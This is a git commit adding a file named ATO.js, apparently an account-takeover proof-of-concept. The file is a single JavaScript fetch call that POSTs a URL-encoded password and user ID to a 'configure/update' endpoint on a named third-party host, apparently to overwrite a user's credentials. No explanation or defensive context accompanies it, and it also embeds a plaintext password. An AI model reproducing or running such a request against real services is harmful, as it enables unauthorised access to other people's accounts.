c86b89f0ae470176b2a06610f1e147a9ed8d1c94
tomoncrss <tonymyson89823@gmail.com>
2025-02-15 15:05:47 +0330

    Add files via upload

---
+++ ATO.js
@@ -0,0 +1,5 @@
+fetch("https://audit1.ftrackapp.com/configure/update", {
+        method: "POST",
+        headers: { "Content-Type": "application/x-www-form-urlencoded" },
+        body: `data=%5B%7B%22password%22%3A%22jhjkhdHJ%4098989jhjhaa%22%2C%22userid%22%3A%229e7a3ff6-75ce-4510-8cdb-852bba9a737a%22%7D%5D&name=users`
+      });
